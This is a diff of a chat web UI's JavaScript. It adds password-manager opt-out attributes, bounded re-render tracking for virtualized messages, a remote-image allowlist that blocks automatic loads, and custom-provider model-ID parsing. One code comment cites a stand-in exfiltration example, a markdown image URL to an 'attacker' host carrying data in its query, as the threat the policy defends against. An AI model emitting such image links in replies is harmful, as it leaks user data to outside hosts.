@@ -35,6 +35,24 @@ let _offlineHealthProbePromise=null;
 let _offlineFetchProbeFailures=0;
 let _offlineRawFetch=null;
 let _offlineFetchPatched=false;
+// #7542 helper: tag a free-text input (chat title, project name, file
+// rename, etc.) with the full set of attributes the WebUI's other
+// credential-shaped fields use, so Chrome and password-manager
+// extensions (1Password, LastPass, Bitwarden, Dashlane) do not
+// mis-classify it as a login form. Call from every site that creates
+// a ``createElement('input')`` text field for naming or renaming.
+function _markNonCredentialInput(inp){
+  if(!inp) return inp;
+  inp.autocomplete='off';
+  inp.setAttribute('autocorrect','off');
+  inp.setAttribute('autocapitalize','off');
+  inp.setAttribute('spellcheck','false');
+  inp.setAttribute('data-1p-ignore','true');
+  inp.setAttribute('data-lpignore','true');
+  inp.setAttribute('data-bwignore','true');
+  inp.setAttribute('data-form-type','other');
+  return inp;
+}
 function _browserReportsOnline(){return !('onLine' in navigator)||navigator.onLine!==false;}
 function _offlineHealthUrl(){const url=new URL('health',document.baseURI||location.href);url.searchParams.set('offline_probe',String(Date.now()));return url.href;}
 function _setOfflineChecking(checking){
@@ -556,7 +574,24 @@ function _messageVirtualDefaultHeightForRole(role){
     role&&Object.prototype.hasOwnProperty.call(MESSAGE_VIRTUAL_DEFAULT_ROW_HEIGHTS,role)?role:'default'
   ];
 }
-const MESSAGE_VIRTUAL_MEASUREMENT_MAX_RERENDERS=2;
+// Cycle-aware measurement burst tracking (#6654/#6717): instead of a flat
+// render cap, the burst remembers every window cycle key it has already seen.
+// An UNSEEN key means the window is still converging forward (A->B->C->settled
+// — content reflow, late fonts/images, dynamic height) and may proceed; a key
+// that REPEATS means the browser is oscillating (A->B->A->B) and the burst
+// terminates. Keys repeat only when geometry flaps, so legitimate convergence
+// is never capped while oscillation is always bounded.
+// Absolute per-burst ceiling (#6717 re-gate): the seen-key rule alone only
+// ends the burst on a REPEATED key, so a browser emitting a monotonically
+// changing geometry (A->B->C->D->... never repeating) would still loop without
+// limit — the #6654 CPU-runaway class under a different trigger — and the
+// seen-key collection would grow without bound (memory). A distinct-key
+// convergence realistically settles in a handful of frames, so this
+// conservative cap (the historical MESSAGE_VIRTUAL_MEASUREMENT_MAX_RERENDERS
+// was 2) ends the burst regardless of key novelty AND bounds the seen-key
+// memory to the cap. Reset through _resetMessageVirtualMeasurementBurst().
+const MESSAGE_VIRTUAL_MEASUREMENT_MAX_RERENDERS=12;
+let _messageVirtualMeasurementSeenKeys=[];
 let _messageRenderWindowSid=null;
 let _messageRenderWindowSize=MESSAGE_RENDER_WINDOW_DEFAULT;
 let _messageVirtualHeightCache=[];
@@ -567,7 +602,19 @@ let _messageVirtualEstimatedRowHeight=_messageVirtualDefaultHeightForRole('defau
 let _messageVirtualScrollRaf=0;
 let _messageVirtualWindowKey='';
 let _messageVirtualMeasurementCycleKey='';
-let _messageVirtualMeasurementRetryCount=0;
+let _messageVirtualMeasurementBurstActive=false;
+// Provenance of the QUEUED virtualized render: 'internal' while the pending
+// rAF was requested by the internal measurement chain, 'external' for any
+// other trigger (user scroll / scroll-settle / message append / session
+// load). The origin lives on the QUEUED render itself, NOT in a global
+// consumable flag: when an internal and an external request coalesce into one
+// rAF, _scheduleMessageVirtualizedRender lets EXTERNAL win, so a render that
+// fires after any external trigger is never mis-attributed as internal
+// (#6717 re-gate). renderMessages() resets the burst on every UNMARKED
+// (externally initiated) render trigger, so an overlapping external render
+// always starts a fresh cycle even when an internal measurement callback is
+// still pending.
+let _messageVirtualRenderQueuedOrigin=null;
 let _messageVirtualScrollActive=false;
 let _messageVirtualScrollSettleTimer=0;
 let _messageVirtualDeferredMeasurement=null;
@@ -614,7 +661,7 @@ function _clearMessageVirtualHeightCache(){
   _messageVirtualEstimatedRowHeight=_messageVirtualDefaultHeightForRole('default');
   _messageVirtualWindowKey='';
   _messageVirtualMeasurementCycleKey='';
-  _messageVirtualMeasurementRetryCount=0;
+  _resetMessageVirtualMeasurementBurst();
   _messageVirtualScrollActive=false;
   clearTimeout(_messageVirtualScrollSettleTimer);
   _messageVirtualScrollSettleTimer=0;
@@ -742,6 +789,13 @@ function _messageVirtualMeasurementCycleKeyFor(windowMetrics){
     windowMetrics.tailStart||0,
   ].join(':');
 }
+function _resetMessageVirtualMeasurementBurst(){
+  _messageVirtualMeasurementSeenKeys=[];
+  _messageVirtualMeasurementBurstActive=false;
+  // Strip any pending internal provenance: an external reset must never let
+  // an internal marker survive onto a render that fires later (#6717 re-gate).
+  _messageVirtualRenderQueuedOrigin=null;
+}
 function _scheduleMessageVirtualMeasurementRefresh(windowMetrics){
   if(_messageVirtualScrollActive){
     _messageVirtualDeferredMeasurement=windowMetrics;
@@ -750,15 +804,55 @@ function _scheduleMessageVirtualMeasurementRefresh(windowMetrics){
   const cycleKey=_messageVirtualMeasurementCycleKeyFor(windowMetrics);
   if(_messageVirtualMeasurementCycleKey!==cycleKey){
     _messageVirtualMeasurementCycleKey=cycleKey;
-    _messageVirtualMeasurementRetryCount=0;
   }
-  if(_messageVirtualMeasurementRetryCount>=MESSAGE_VIRTUAL_MEASUREMENT_MAX_RERENDERS) return;
-  _messageVirtualMeasurementRetryCount++;
-  requestAnimationFrame(()=>{ _scheduleMessageVirtualizedRender(true); });
+  // Cycle-aware burst tracking (#6717 re-gate): the burst follows ONLY the
+  // internally measurement-scheduled chain (requestAnimationFrame ->
+  // _scheduleMessageVirtualizedRender -> renderMessages -> re-measure -> here).
+  // Within one burst we remember every cycle key already seen. An UNSEEN key
+  // (genuine forward convergence A->B->C->settled — content reflow, late
+  // fonts/images, dynamic height) may proceed, so convergence is never capped
+  // at a flat render count; a key that REPEATS (WebKit's A->B->A->B window
+  // oscillation) ends the burst, so the rAF/measure loop can never run forever
+  // (#6654). The burst starts fresh on every EXTERNALLY initiated render
+  // (session load, message append, real content change — see renderMessages)
+  // and on measurement settlement — never on a cycle-key change alone.
+  if(!_messageVirtualMeasurementBurstActive){
+    _messageVirtualMeasurementSeenKeys=[];
+    _messageVirtualMeasurementBurstActive=true;
+  }
+  // Absolute per-burst cap (#6717 re-gate): even an ALL-DISTINCT monotonic
+  // key sequence (A->B->C->D->... never repeating) must terminate — a repeated
+  // key is not the only way the burst can end. This also bounds the seen-key
+  // collection to the cap (memory). Distinct-key convergence settles in a
+  // handful of frames, so the cap is far above any legitimate multi-pass
+  // reflow while still closing the #6654 CPU-runaway class.
+  if(_messageVirtualMeasurementSeenKeys.length>=MESSAGE_VIRTUAL_MEASUREMENT_MAX_RERENDERS){
+    _resetMessageVirtualMeasurementBurst();
+    return;
+  }
+  const lastKey = _messageVirtualMeasurementSeenKeys.length ? _messageVirtualMeasurementSeenKeys[_messageVirtualMeasurementSeenKeys.length - 1] : null;
+  if(cycleKey !== lastKey && _messageVirtualMeasurementSeenKeys.includes(cycleKey)){
+    // Non-consecutive repeated key (A->B->A): the window is oscillating, not
+    // converging. End the burst (no further internal re-render is scheduled),
+    // so the next externally initiated cycle starts fresh instead of being
+    // starved of retries. A consecutive same-key pass (A->A) proceeds because
+    // heights changed while the window bounds did not (e.g. row shrink across
+    // two passes), still bounded by the absolute per-burst cap (#6717 re-gate).
+    _resetMessageVirtualMeasurementBurst();
+    return;
+  }
+  _messageVirtualMeasurementSeenKeys.push(cycleKey);
+  // The internal-measurement origin travels WITH the scheduled render request
+  // (threaded through BOTH rAF layers into renderMessages), so coalescing can
+  // never consume a stale global marker onto an unrelated render. When an
+  // external request coalesces into the queued rAF, EXTERNAL wins and the
+  // render that fires degrades to an unmarked (burst-resetting) render
+  // (#6717 re-gate).
+  requestAnimationFrame(()=>{ _scheduleMessageVirtualizedRender(true,{origin:'internal'}); });
 }
 function _markMessageVirtualMeasurementsSettled(windowMetrics){
   _messageVirtualMeasurementCycleKey=_messageVirtualMeasurementCycleKeyFor(windowMetrics);
-  _messageVirtualMeasurementRetryCount=0;
+  _resetMessageVirtualMeasurementBurst();
 }
 function _messageVirtualHeightEntryMatches(previousEntry, nextEntry){
   return !!(
@@ -1474,7 +1568,7 @@ function _rememberRenderedUserRowIntrinsicHeights(){
     }
   }
 }
-function _scheduleMessageVirtualizedRender(force){
+function _scheduleMessageVirtualizedRender(force, request){
   const container=$('messages');
   const inner=$('msgInner');
   if(!container||!inner) return;
@@ -1486,9 +1580,28 @@ function _scheduleMessageVirtualizedRender(force){
     _messageVirtualWindowKey=nextKey;
     return;
   }
-  if(_messageVirtualScrollRaf) return;
+  // The request carries its own origin: the internal measurement chain passes
+  // {origin:'internal'} (see _scheduleMessageVirtualMeasurementRefresh);
+  // every other caller is external by default.
+  const requestOrigin=(request&&request.origin==='internal')?'internal':'external';
+  if(_messageVirtualScrollRaf){
+    // Coalescing into an already-queued rAF: the queued render is shared, so
+    // merge the provenance. EXTERNAL always wins — the render that actually
+    // fires must reset the burst, and an internal marker must never survive
+    // onto an external render (#6717 re-gate). An internal request joining a
+    // queued render never downgrades an already-external one.
+    if(requestOrigin==='external') _messageVirtualRenderQueuedOrigin='external';
+    return;
+  }
+  _messageVirtualRenderQueuedOrigin=requestOrigin;
   _messageVirtualScrollRaf=requestAnimationFrame(()=>{
     _messageVirtualScrollRaf=0;
+    // The provenance belongs to THIS queued render: it was set when the render
+    // was scheduled (and possibly flipped to 'external' by a coalesced
+    // external request). Consume it here — no global consumable flag that an
+    // unrelated render could steal (#6717 re-gate).
+    const internalMeasurement=_messageVirtualRenderQueuedOrigin==='internal';
+    _messageVirtualRenderQueuedOrigin=null;
     const liveVisWithIdx=_getVisibleMessagesWithIdx();
     const liveWindow=_currentMessageVirtualWindow(liveVisWithIdx,_messageVirtualKeepTailCount());
     const liveKey=_messageVirtualWindowKeyFor(liveWindow);
@@ -1496,14 +1609,14 @@ function _scheduleMessageVirtualizedRender(force){
     if(_scrollbarDragActive){
       _programmaticScroll=true;
       _programmaticScrollSetAt=performance.now();
-      _compensateScrollForMeasurementDelta(()=>{ renderMessages({ preserveScroll:true }); });
+      _compensateScrollForMeasurementDelta(()=>{ renderMessages({ preserveScroll:true, _internalMeasurement: internalMeasurement }); });
       _deferClearProgrammaticScroll();
       _messageVirtualWindowKey=liveKey;
       return;
     }
     _msgNodeRecycleEnabled=true;
     try{
-      _compensateScrollForMeasurementDelta(()=>{ renderMessages({ preserveScroll:true }); });
+      _compensateScrollForMeasurementDelta(()=>{ renderMessages({ preserveScroll:true, _internalMeasurement: internalMeasurement }); });
     }
     finally{ _msgNodeRecycleEnabled=false; }
   });
@@ -2738,6 +2851,85 @@ function _dataImageHtml(ref, altText){
   return `<img class="msg-media-img" src="${esc(ref)}" alt="${esc(altText||'image')}" loading="lazy">`;
 }
 
+// Remote image policy (#7941). The served CSP img-src is default-deny for
+// remote origins: an assistant reply containing ![x](https://attacker/?d=...)
+// must not make the browser beacon to that host on render. Operators opt
+// specific origins back in with HERMES_WEBUI_CSP_IMG_EXTRA; the server hands
+// the validated list to the page as window.__HERMES_CONFIG__.imgSrcExtra. The
+// renderer mirrors that list so a non-allowlisted remote image becomes an inert
+// "Open image" link (nothing is fetched until the user clicks) instead of a
+// broken <img> the browser refuses to load. The CSP header stays the security
+// boundary: a mismatch here only changes which fallback is shown.
+function _remoteImageSources(){
+  const cfg=(typeof window!=='undefined'&&window.__HERMES_CONFIG__)||{};
+  return Array.isArray(cfg.imgSrcExtra)?cfg.imgSrcExtra.map(String):[];
+}
+
+function _remoteImageSourceMatches(source, url){
+  const s=String(source||'').trim().toLowerCase();
+  if(s==='https:') return url.protocol==='https:';
+  if(s==='http:') return url.protocol==='http:'||url.protocol==='https:';
+  const m=s.match(/^(https?):\/\/(\*\.)?([a-z0-9._~-]+)(?::(\d{1,5}|\*))?$/);
+  if(!m) return false;
+  const scheme=m[1]+':';
+  if(!(url.protocol===scheme||(scheme==='http:'&&url.protocol==='https:'))) return false;
+  const host=url.hostname.toLowerCase();
+  if(m[2]){
+    if(!(host.length>m[3].length+1&&host.endsWith('.'+m[3]))) return false;
+  }else if(host!==m[3]){
+    return false;
+  }
+  if(m[4]==='*') return true;
+  const defaultPort=url.protocol==='https:'?'443':'80';
+  const urlPort=url.port||defaultPort;
+  const sourcePort=m[4]||(scheme==='https:'?'443':'80');
+  if(!m[4]&&scheme==='http:'&&url.protocol==='https:') return urlPort==='443';
+  return urlPort===sourcePort;
+}
+
+// True when an image URL may load inline: relative (same origin by
+// definition), same origin as the page, a non-http(s) scheme (data:/blob: and
+// friends are judged by the existing sanitizers), or matched by an
+// operator-allowlisted img-src source. Scheme-relative `//host/x` and
+// backslash forms the browser normalises (`https:\\host`) are treated as
+// absolute so they cannot slip past as "relative".
+function _remoteImageAllowed(raw){
+  // Normalise the way the URL parser does before classifying: strip leading/
+  // trailing C0-control-or-space and remove every tab/LF/CR, so `\x01https://x`
+  // or `ht\ttps://x` cannot pass as "relative" while the browser loads it.
+  const value=String(raw||'').replace(/^[\u0000-\u0020]+|[\u0000-\u0020]+$/g,'').replace(/[\t\n\r]/g,'');
+  if(!value) return true;
+  const isAbsolute=/^[a-z][a-z0-9+.-]*:/i.test(value)||/^[\\/]{2}/.test(value);
+  if(!isAbsolute) return true;
+  const hasLocation=typeof location!=='undefined'&&location&&location.href;
+  let url;
+  try{url=new URL(value, hasLocation?location.href:'http://invalid.invalid/');}catch(_){return false;}
+  if(url.protocol!=='http:'&&url.protocol!=='https:') return true;
+  if(hasLocation&&url.origin===location.origin) return true;
+  return _remoteImageSources().some(source=>_remoteImageSourceMatches(source,url));
+}
+
+function _remoteImageReason(raw){
+  let host='';
+  try{host=new URL(String(raw||'')).host;}catch(_){host='';}
+  const reason=(typeof t==='function'?t('remote_image_reason'):'')||'Remote image not loaded automatically. Opens {host} in a new tab.';
+  return reason.replace('{host}', host||'the link');
+}
+
+function _remoteImagePlaceholderHtml(raw, altText){
+  let host='';
+  try{host=new URL(String(raw||'')).host;}catch(_){host='';}
+  const label=(typeof t==='function'?t('remote_image_open'):'')||'Open image';
+  // Say WHY the picture is not shown (title only: aria-label would replace the
+  // visible 'Open image' accessible name, WCAG 2.5.3), like the PDF/HTML
+  // preview fallbacks and mail clients do. Alt text is model-controlled, so it
+  // only ever goes in the title after the reason, never in the visible label.
+  const reason=_remoteImageReason(raw);
+  const alt=String(altText||'').trim();
+  const tip=alt&&alt!=='image'?`${reason} (${alt.slice(0,120)})`:reason;
+  return `<a class="msg-media-link" href="${esc(String(raw||''))}" target="_blank" rel="noopener" title="${esc(tip)}">🖼 ${esc(label)}${host?` · ${esc(host)}`:''}</a>`;
+}
+
 // Markdown image syntax ![alt](url) → HTML. https:// keeps the historical direct
 // <img>; file:// and bare data:image/ URIs route through the same helpers the
 // MEDIA: pipeline uses, so ![x](file:///p.png) renders the artifact card instead
@@ -2750,7 +2942,67 @@ function _mdImageHtml(alt, url){
     return esc(`![${alt}](${String(url).slice(0,64)}…)`);
   }
   if(/^file:\/\//i.test(url)) return _inlineMediaHtmlForRef(url,undefined,alt);
+  if(typeof _remoteImageAllowed==='function'&&!_remoteImageAllowed(url)) return _remoteImagePlaceholderHtml(url, alt);
   return `<img src="${url.replace(/"/g,'%22')}" alt="${esc(alt)}" class="msg-media-img" loading="lazy">`;
+}
+
+function _mediaTokenParts(source, matchOffset, rawRef){
+  let ref=String(rawRef||'');
+  let suffix='';
+  const before=String(source||'').slice(0,Number(matchOffset)||0);
+  // Quotes are valid path/URL bytes, so detach one only when the prose has the
+  // same opener immediately before MEDIA:. The entity forms are what the real
+  // streaming parser passes after escaping text nodes.
+  for(const family of [
+    {value:'"', forms:['"','&quot;']},
+    {value:"'", forms:["'",'&#39;']},
+  ]){
+    if(!family.forms.some(form=>before.endsWith(form))) continue;
+    let quote='', closeAt=-1;
+    for(const form of family.forms){
+      const index=ref.lastIndexOf(form);
+      if(index>closeAt){ quote=form; closeAt=index; }
+    }
+    if(closeAt<=0) continue;
+    const afterQuote=ref.slice(closeAt+quote.length);
+    if(!/^[.,;:!?]*$/.test(afterQuote)) continue;
+    ref=ref.slice(0,closeAt);
+    suffix=family.value+afterQuote;
+    break;
+  }
+  let punctuationStart=ref.length;
+  while(punctuationStart>0&&'.,;:!?'.includes(ref.charAt(punctuationStart-1))){
+    punctuationStart-=1;
+  }
+  const trailingPunctuation=ref.slice(punctuationStart);
+  for(const delimiter of ['***','___','**','__','*','_','`']){
+    if(!before.endsWith(delimiter)) continue;
+    const openerStart=before.length-delimiter.length;
+    if(openerStart>0&&before.charAt(openerStart-1)===delimiter.charAt(0)) continue;
+    let candidate=ref;
+    let afterDelimiter='';
+    if(trailingPunctuation&&candidate.slice(0,-trailingPunctuation.length).endsWith(delimiter)){
+      candidate=candidate.slice(0,-trailingPunctuation.length);
+      afterDelimiter=trailingPunctuation;
+    }
+    if(candidate===delimiter) return null;
+    if(candidate.endsWith(delimiter)&&candidate.length>delimiter.length){
+      const closerStart=candidate.length-delimiter.length;
+      if(candidate.charAt(closerStart-1)===delimiter.charAt(0)) continue;
+      ref=candidate.slice(0,-delimiter.length);
+      // The matching closer proves only its own bytes are outside the
+      // reference. Punctuation immediately before it may be a legal
+      // filename or URL byte and must remain bound to the ref.
+      suffix=delimiter+afterDelimiter;
+      break;
+    }
+  }
+  // A bare trailing punctuation byte is ambiguous: it may be prose, but it
+  // may also be part of a real local filename or remote URL. Only the quote
+  // and delimiter branches above have evidence from a matching opener that a
+  // closer is outside the MEDIA ref, so preserve every other byte verbatim.
+  if(!ref) return null;
+  return [ref,suffix];
 }
 
 function _inlineMediaHtmlForRef(ref, sessionId, altText){
@@ -2783,13 +3035,16 @@ function _inlineMediaHtmlForRef(ref, sessionId, altText){
       src=src.replace(/^https?:\/\/(localhost|127\.0\.0\.1)(:\d+)?/i,base);
     }
     const urlPath=src.split('?')[0];
+    const mediaKind=_mediaKindForName(urlPath);
+    if(mediaKind==='audio'||mediaKind==='video') return _mediaPlayerHtml(mediaKind,src,urlPath.split('/').pop()||mediaKind);
+    // Remote image outside the CSP img-src allowlist (#7941): render an inert
+    // click-to-open link so the browser makes no request on render.
+    if(typeof _remoteImageAllowed==='function'&&!_remoteImageAllowed(src)) return _remoteImagePlaceholderHtml(src);
     // SVG URLs → render inline as image (must precede the https:// <img>
     // catch-all below so extensionless CDN SVG paths still match)
     if(_SVG_EXTS.test(urlPath)){
       return `<img class="msg-media-svg" src="${esc(src)}" alt="${esc(typeof t==='function'?t('media_svg_label'):'svg')}" loading="lazy">`;
     }
-    const mediaKind=_mediaKindForName(urlPath);
-    if(mediaKind==='audio'||mediaKind==='video') return _mediaPlayerHtml(mediaKind,src,urlPath.split('/').pop()||mediaKind);
     // Render all https:// URLs as <img> — extensionless CDN paths like fal.media still work (#853)
     if(_IMAGE_EXTS.test(urlPath) || /^https?:\/\//i.test(src)){
       return `<img class="msg-media-img" src="${esc(src)}" alt="image" loading="lazy">`;
@@ -3011,12 +3266,54 @@ function _getOptionProviderId(opt){
     return group.dataset.provider;
   }
   const value=String(opt.value||'');
-  if(value.startsWith('@') && value.includes(':')) return value.slice(1,value.lastIndexOf(':'));
+  if(value.startsWith('@') && value.includes(':')){
+    // Non-greedy parse for @custom:<slug>:<model> — provider is the slug only.
+    // Preserves endpoint-style host:port custom slugs (e.g. custom:localhost:11434)
+    // while keeping colon-bearing model ids (e.g. @custom:backup:model-a:free -> custom:backup).
+    if(value.startsWith('@custom:')){
+      const afterCustom=value.substring('@custom:'.length);
+      const parts=afterCustom.split(':');
+      if(parts.length>=3 && /^\d+$/.test(parts[1])){
+        const port=parseInt(parts[1], 10);
+        const host=parts[0];
+        const hl=host.toLowerCase();
+        if(port>=1 && port<=65535 && (hl==='localhost' || host.includes('.'))){
+          return 'custom:'+host+':'+parts[1];
+        }
+      }
+      const firstColon=afterCustom.indexOf(':');
+      if(firstColon>=0) return 'custom:'+afterCustom.substring(0,firstColon);
+      return 'custom:'+afterCustom;
+    }
+    // Other @provider:model — provider is up to first colon
+    return value.slice(1,value.indexOf(':'));
+  }
   return '';
 }
 function _providerFromModelValue(modelId){
   const value=String(modelId||'').trim();
-  if(value.startsWith('@')&&value.includes(':')) return value.slice(1,value.lastIndexOf(':'));
+  if(value.startsWith('@')&&value.includes(':')){
+    // Non-greedy parse for @custom:<slug>:<model> — provider is the slug only.
+    // Preserves endpoint-style host:port custom slugs (e.g. custom:localhost:11434)
+    // while keeping colon-bearing model ids (e.g. @custom:backup:model-a:free -> custom:backup).
+    if(value.startsWith('@custom:')){
+      const afterCustom=value.substring('@custom:'.length);
+      const parts=afterCustom.split(':');
+      if(parts.length>=3 && /^\d+$/.test(parts[1])){
+        const port=parseInt(parts[1], 10);
+        const host=parts[0];
+        const hl=host.toLowerCase();
+        if(port>=1 && port<=65535 && (hl==='localhost' || host.includes('.'))){
+          return 'custom:'+host+':'+parts[1];
+        }
+      }
+      const firstColon=afterCustom.indexOf(':');
+      if(firstColon>=0) return 'custom:'+afterCustom.substring(0,firstColon);
+      return 'custom:'+afterCustom;
+    }
+    // Other @provider:model — provider is up to first colon
+    return value.slice(1,value.indexOf(':'));
+  }
   return '';
 }
 function _modelPickerOptionIdentity(modelId, providerId){
@@ -3027,9 +3324,19 @@ function _modelPickerOptionIdentity(modelId, providerId){
     if(exactPrefix && value.toLowerCase().startsWith(exactPrefix.toLowerCase())){
       value=value.substring(exactPrefix.length);
     }else if(value.startsWith('@custom:')){
-      const namedProvider=value.substring('@custom:'.length);
-      const splitAt=namedProvider.indexOf(':');
-      value=splitAt>=0 ? namedProvider.substring(splitAt+1) : namedProvider;
+      const afterCustom=value.substring('@custom:'.length);
+      const parts=afterCustom.split(':');
+      let splitAt=-1;
+      if(parts.length>=3 && /^\d+$/.test(parts[1])){
+        const port=parseInt(parts[1], 10);
+        const host=parts[0];
+        const hl=host.toLowerCase();
+        if(port>=1 && port<=65535 && (hl==='localhost' || host.includes('.'))){
+          splitAt=parts[0].length + 1 + parts[1].length;
+        }
+      }
+      if(splitAt<0) splitAt=afterCustom.indexOf(':');
+      value=splitAt>=0 ? afterCustom.substring(splitAt+1) : afterCustom;
     }else{
       value=value.substring(value.indexOf(':')+1);
     }
@@ -3088,7 +3395,25 @@ function _modelStateForSelect(sel, modelId){
     // id (e.g. model-a:free) synthesized as @custom:backup:model-a:free would
     // otherwise mis-parse to provider "custom:backup:model-a" (#6221 re-gate).
     const routedProvider=selected?String(_getOptionProviderId(selected)||'').trim():'';
-    return {model:routedModel||value,model_provider:routedProvider||explicitProvider};
+    // Normally-rendered catalog options only carry the qualified
+    // @custom:<slug>:<model> value — data-model is set solely by the fallback
+    // injection path (_ensureModelOptionInDropdown). When it is missing, strip
+    // the @custom:<slug>: prefix instead of sending the raw dropdown value as
+    // the model id (#6884). The prefix must come from the option metadata's
+    // authoritative provider (routedProvider), NOT from explicitProvider: the
+    // latter re-parses the value at its LAST colon, so a colon-bearing model
+    // id like @custom:backup:model-a:free would otherwise strip to just
+    // "free" (re-gate on the #6221 family). Only custom providers are
+    // stripped: a non-custom qualified id like @safe:gpt-4o-mini is a real
+    // provider namespace and must be preserved (#1771).
+    const effectiveProvider=routedProvider||explicitProvider;
+    const effectiveProviderLc=effectiveProvider.toLowerCase();
+    const isCustomProvider=effectiveProviderLc==='custom'||effectiveProviderLc.startsWith('custom:');
+    const explicitPrefix=`@${effectiveProvider}:`;
+    const strippedModel=isCustomProvider&&value.toLowerCase().startsWith(explicitPrefix.toLowerCase())
+      ?value.slice(explicitPrefix.length)
+      :value;
+    return {model:routedModel||strippedModel||value,model_provider:effectiveProvider};
   }
   // Resolve the provider from the option whose VALUE matches the requested
   // model — never blindly from sel.selectedOptions[0] (#5567). During a profile
@@ -3937,11 +4262,21 @@ function _normalizeConfiguredModelKey(modelId){
 function _isEquivalentConfiguredModelEntry(modelId,badge,entries){
   const normalized=_normalizeConfiguredModelKey(modelId);
   const provider=String(badge&&badge.provider||'').toLowerCase();
+  // A row synthesized from an ungrouped top-level OPTION (temporary/custom
+  // entries added by _ensureModelOptionInDropdown) is stored with providerId:''
+  // even when the option carries provider identity, so that row's provider
+  // authority has to fall back to its badge provider (same fallback already
+  // used by _modelProviderForSelectedBadge below). Without it neither the
+  // same-normalized fast path nor the routed spellings can see the row as
+  // belonging to that provider (#7290).
+  const _entryProvider=(entry)=>String(
+    (entry&&entry.providerId)||(entry&&entry.badge&&entry.badge.provider)||''
+  ).toLowerCase();
   const matchingEntries=(entries||[]).filter(existing=>
     _normalizeConfiguredModelKey(existing.value)===normalized
   );
   if(matchingEntries.some(existing=>{
-    const entryProvider=String(existing.providerId||'').toLowerCase();
+    const entryProvider=_entryProvider(existing);
     return !provider||!entryProvider||entryProvider===provider;
   })) return true;
   // @provider:model is an equivalent routing spelling only when an existing
@@ -3966,7 +4301,7 @@ function _isEquivalentConfiguredModelEntry(modelId,badge,entries){
   if(slashPrefix&&rawId.toLowerCase().startsWith(slashPrefix)){
     const slashRoutedId=rawId.slice(slashPrefix.length);
     if(slashRoutedId&&(entries||[]).some(entry=>
-      String(entry.providerId||'').toLowerCase()===provider
+      _entryProvider(entry)===provider
       &&_normalizeConfiguredModelKey(entry.value)===_normalizeConfiguredModelKey(slashRoutedId)
     )) return true;
   }
@@ -3974,7 +4309,7 @@ function _isEquivalentConfiguredModelEntry(modelId,badge,entries){
   if(!prefix||!rawId.toLowerCase().startsWith(prefix)) return false;
   const routedId=rawId.slice(prefix.length);
   return (entries||[]).some(entry=>
-    String(entry.providerId||'').toLowerCase()===provider
+    _entryProvider(entry)===provider
     &&_normalizeConfiguredModelKey(entry.value)===_normalizeConfiguredModelKey(routedId)
   );
 }
@@ -4419,7 +4754,15 @@ function renderModelDropdown(){
       const displayName=rawValue.startsWith('@custom:')
         ? getModelLabel(rawValue)
         : (child.textContent||getModelLabel(rawValue));
-      _modelData.push({value:child.value,name:esc(displayName),id:esc(child.value),group:'',groupKey,providerId:'',badge:_getConfiguredModelBadge(child.value,_badgeMap),hiddenByDefault:false});
+      // Keep the option's own provider authority: _ensureModelOptionInDropdown
+      // stamps dataset.provider on the temporary options it adds, and that
+      // authority has to reach both places later comparisons read (the
+      // structural providerId and the configured badge lookup). Storing
+      // providerId:'' here let a badge-owned `@commandcode:model-a` row claim
+      // providerless authority and suppress another provider's
+      // same-normalized configured entries (#7290).
+      const optionProviderId=_getOptionProviderId(child);
+      _modelData.push({value:child.value,name:esc(displayName),id:esc(child.value),group:'',groupKey,providerId:optionProviderId,badge:_getConfiguredModelBadge(child.value,_badgeMap,optionProviderId),hiddenByDefault:false});
       _groupMeta.get(groupKey).modelCount++;
     }
   }
@@ -4430,6 +4773,10 @@ function renderModelDropdown(){
       name:esc(getModelLabel(modelId)),
       id:esc(modelId),
       group:'',
+      // Stamp the badge provider onto the appended row so its provider
+      // authority is structural here instead of depending on the badge
+      // fallback later (#7290).
+      providerId:String((badge&&badge.provider)||''),
       badge,
     });
   }
@@ -4465,7 +4812,23 @@ function renderModelDropdown(){
     const _provider=String((m&&m.providerId)||(m&&m.badge&&m.badge.provider)||((typeof _providerFromModelValue==='function')?_providerFromModelValue(m&&m.value):'')||'').trim();
     return (_provider&&_provider!=='default')?_provider:null;
   };
-  const _isSelectedModelRow=(m)=>String((m&&m.value)||'')===String((_selectedModelState&&_selectedModelState.model)||(sel&&sel.value)||'')&&String(_modelProviderForSelectedBadge(m)||'')===String((_selectedModelState&&_selectedModelState.model_provider)||'');
+  const _isSelectedModelRow=(m)=>{
+    const _rowModel=String((m&&m.value)||'');
+    const _rowProvider=String(_modelProviderForSelectedBadge(m)||'');
+    const _stateModel=String((_selectedModelState&&_selectedModelState.model)||(sel&&sel.value)||'');
+    const _stateProvider=String((_selectedModelState&&_selectedModelState.model_provider)||'');
+    // Normalize both sides to the same model/provider identity. Catalog rows
+    // carry the qualified @custom:<slug>:<model> value while the outgoing
+    // state model is bare (#6884) — a raw string comparison would leave no
+    // row marked active/"Selected" after a restore. _modelPickerOptionIdentity
+    // is the same identity used for picker dedup, so the row that survives is
+    // exactly the one the send path resolves.
+    const _norm=(model,provider)=>typeof _modelPickerOptionIdentity==='function'
+      ?_modelPickerOptionIdentity(model,provider)
+      :String(model||'');
+    return _norm(_rowModel,_rowProvider)===_norm(_stateModel,_stateProvider)
+      &&_rowProvider===_stateProvider;
+  };
   const _selectedModelBadge=(m)=>_isSelectedModelRow(m)
     ?`<span class="model-opt-badge model-opt-badge--selected">${esc(t('model_badge_selected')||'Selected')}</span>`
     :'';
@@ -4696,19 +5059,17 @@ function renderModelDropdown(){
         const row=document.createElement('div');
         row.className='model-opt'+(_isSelectedModelRow(m)?' active':'');
         let badgeLabel = '';
-        let modelName = m.name;
         if (m.badge) {
           // 直接用badge的原始key（即config.yaml里的ID）
           const rawId = badgeKeyMap.get(m.badge) || m.value || m.badge.label || 'Configured';
           badgeLabel = rawId;
-          modelName = rawId; // model-opt-name直接用原始ID
           if(m.badge.provider){
             const providerName=m.badge.provider.replace(/^custom:/,'').split('/')[0];
             badgeLabel += ` (${providerName})`;
           }
         }
         const badgeHtml=m.badge?`<span class="model-opt-badge model-opt-badge--${esc(m.badge.role||'configured')}">${esc(badgeLabel)}</span>`:'';
-        row.innerHTML=`<div class="model-opt-top"><span class="model-opt-name">${esc(modelName)}</span>${badgeHtml}${_selectedModelBadge(m)}</div><span class="model-opt-id">${esc(m.id)}</span>`;
+        row.innerHTML=`<div class="model-opt-top"><span class="model-opt-name">${m.name}</span>${badgeHtml}${_selectedModelBadge(m)}</div><span class="model-opt-id">${esc(m.id)}</span>`;
         row.onclick=()=>selectFromDropdown(m.value,(m.badge&&m.badge.provider)||m.providerId||null);
         dd.appendChild(row);
       }
@@ -7729,19 +8090,11 @@ function renderMd(raw){
   // generated images) and replace them with inline <img> or download links.
   // Stashed so the path/URL is never processed as markdown.
   const media_stash=[];
